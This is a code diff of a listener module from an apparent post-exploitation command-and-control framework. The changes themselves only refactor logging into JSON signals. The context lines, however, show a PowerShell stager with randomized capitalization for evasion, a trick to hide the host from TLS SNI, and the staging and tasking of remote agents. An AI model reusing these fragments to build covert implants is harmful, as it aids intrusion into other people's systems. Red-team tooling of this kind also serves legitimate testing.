@@ -5,6 +5,7 @@ import os
 import ssl
 import time
 import copy
+import json
 import sys
 from pydispatch import dispatcher
 from flask import Flask, request, make_response
@@ -234,7 +235,7 @@ class Listener:
                         if "https" in host:
                             host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
                         else:
-                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port) 
+                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)
 
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
@@ -259,7 +260,7 @@ class Listener:
                     for header in customHeaders:
                         headerKey = header.split(':')[0]
                         headerValue = header.split(':')[1]
-                        
+
                         if headerKey.lower() == "host":
                             modifyHost = True
 
@@ -270,7 +271,7 @@ class Listener:
                 #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                 if modifyHost:
                     stager += helpers.randomize_capitalization("$ie.navigate2($ser,$fl,0,$Null,$Null);while($ie.busy){Start-Sleep -Milliseconds 100};")
-                
+
                 stager += "$ie.navigate2($ser+$t,$fl,0,$Null,$c);"
                 stager += "while($ie.busy){Start-Sleep -Milliseconds 100};"
                 stager += "$ht = $ie.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $ie.document, $Null).InnerHtml;"
@@ -311,7 +312,7 @@ class Listener:
         host = listenerOptions['Host']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
         customHeaders = profile.split('|')[2:]
-        
+
         # select some random URIs for staging from the main profile
         stage1 = random.choice(uris)
         stage2 = random.choice(uris)
@@ -438,7 +439,7 @@ class Listener:
 
         if language:
             if language.lower() == 'powershell':
-                
+
                 updateServers = """
                     $Script:ControlServers = @("%s");
                     $Script:ServerIndex = 0;
@@ -453,7 +454,7 @@ class Listener:
                     }
 
                 """ % (listenerOptions['Host']['Value'])
-                
+
                 getTask = """
                     function script:Get-Task {
                         try {
@@ -507,7 +508,7 @@ class Listener:
                                 $Headers = ""
                                 $script:Headers.GetEnumerator()| %{ $Headers += "`r`n$($_.Name): $($_.Value)" }
                                 $Headers.TrimStart("`r`n")
-                                
+
                                 try {
                                     # choose a random valid URI for checkin
                                     $taskURI = $script:TaskURIs | Get-Random
@@ -562,7 +563,13 @@ class Listener:
             Before every request, check if the IP address is allowed.
             """
             if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
-                dispatcher.send("[!] %s on the blacklist/not on the whitelist requested resource" % (request.remote_addr), sender="listeners/http_com")
+                listenerName = self.options['Name']['Value']
+                message = "[!] {} on the blacklist/not on the whitelist requested resource".format(request.remote_addr)
+                signal = json.dumps({
+                    'print': True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                 return make_response(self.default_response(), 200)
 
 
@@ -590,9 +597,16 @@ class Listener:
             This is used during the first step of the staging process,
             and when the agent requests taskings.
             """
-
             clientIP = request.remote_addr
-            dispatcher.send("[*] GET request for %s/%s from %s" % (request.host, request_uri, clientIP), sender='listeners/http_com')
+
+            listenerName = self.options['Name']['Value']
+            message = "[*] GET request for {}/{} from {}".format(request.host, request_uri, clientIP)
+            signal = json.dumps({
+                'print': True,
+                'message': message
+            })
+            dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
+
             routingPacket = None
             reqHeader = request.headers.get(listenerOptions['RequestHeader']['Value'])
             if reqHeader and reqHeader != '':
@@ -612,12 +626,24 @@ class Listener:
                                 # handle_agent_data() signals that the listener should return the stager.ps1 code
 
                                 # step 2 of negotiation -> return stager.ps1 (stage 1)
-                                dispatcher.send("[*] Sending %s stager (stage 1) to %s" % (language, clientIP), sender='listeners/http_com')
+                                listenerName = self.options['Name']['Value']
+                                message = "[*] Sending {} stager (stage 1) to {}".format(language, clientIP)
+                                signal = json.dumps({
+                                    'print': True,
+                                    'message': message
+                                })
+                                dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                                 stage = self.generate_stager(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                                 return make_response(base64.b64encode(stage), 200)
 
                             elif results.startswith('ERROR:'):
-                                dispatcher.send("[!] Error from agents.handle_agent_data() for %s from %s: %s" % (request_uri, clientIP, results), sender='listeners/http_com')
+                                listenerName = self.options['Name']['Value']
+                                message = "[!] Error from agents.handle_agent_data() for {} from {}: {}".format(request_uri, clientIP, results)
+                                signal = json.dumps({
+                                    'print': True,
+                                    'message': message
+                                })
+                                dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
 
                                 if 'not in cache' in results:
                                     # signal the client to restage
@@ -628,7 +654,13 @@ class Listener:
 
                             else:
                                 # actual taskings
-                                dispatcher.send("[*] Agent from %s retrieved taskings" % (clientIP), sender='listeners/http_com')
+                                listenerName = self.options['Name']['Value']
+                                message = "[*] Agent from {} retrieved taskings".format(clientIP)
+                                signal = json.dumps({
+                                    'print': True,
+                                    'message': message
+                                })
+                                dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                                 return make_response(base64.b64encode(results), 200)
                         else:
                             # dispatcher.send("[!] Results are None...", sender='listeners/http_com')
@@ -637,7 +669,13 @@ class Listener:
                     return make_response(self.default_response(), 200)
 
             else:
-                dispatcher.send("[!] %s requested by %s with no routing packet." % (request_uri, clientIP), sender='listeners/http_com')
+                listenerName = self.options['Name']['Value']
+                message = "[!] {} requested by {} with no routing packet.".format(request_uri, clientIP)
+                signal = json.dumps({
+                    'print': True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                 return make_response(self.default_response(), 200)
 
 
@@ -665,7 +703,14 @@ class Listener:
                             # TODO: document the exact results structure returned
                             sessionID = results.split(' ')[1].strip()
                             sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
-                            dispatcher.send("[*] Sending agent (stage 2) to %s at %s" % (sessionID, clientIP), sender='listeners/http_com')
+
+                            listenerName = self.options['Name']['Value']
+                            message = "[*] Sending agent (stage 2) to {} at {}".format(sessionID, clientIP)
+                            signal = json.dumps({
+                                'print': True,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
 
                             # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                             agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
@@ -675,10 +720,22 @@ class Listener:
                             return make_response(base64.b64encode(encrypted_agent), 200)
 
                         elif results[:10].lower().startswith('error') or results[:10].lower().startswith('exception'):
-                            dispatcher.send("[!] Error returned for results by %s : %s" %(clientIP, results), sender='listeners/http_com')
+                            listenerName = self.options['Name']['Value']
+                            message = "[!] Error returned for results by {} : {}".format(clientIP, results)
+                            signal = json.dumps({
+                                'print': True,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                             return make_response(self.default_response(), 200)
                         elif results == 'VALID':
-                            dispatcher.send("[*] Valid results return by %s" % (clientIP), sender='listeners/http_com')
+                            listenerName = self.options['Name']['Value']
+                            message = "[*] Valid results return by {}".format(clientIP)
+                            signal = json.dumps({
+                                'print': True,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                             return make_response(self.default_response(), 200)
                         else:
                             return make_response(base64.b64encode(results), 200)
@@ -709,8 +766,13 @@ class Listener:
                 app.run(host=bindIP, port=int(port), threaded=True)
 
         except Exception as e:
-            print helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
-            dispatcher.send("[!] Listener startup on port %s failed: %s " % (port, e), sender='listeners/http_com')
+            listenerName = self.options['Name']['Value']
+            message = "[!] Listener startup on port {} failed: {}".format(port, e)
+            signal = json.dumps({
+                'print': True,
+                'message': message
+            })
+            dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
 
 
     def start(self, name=''):
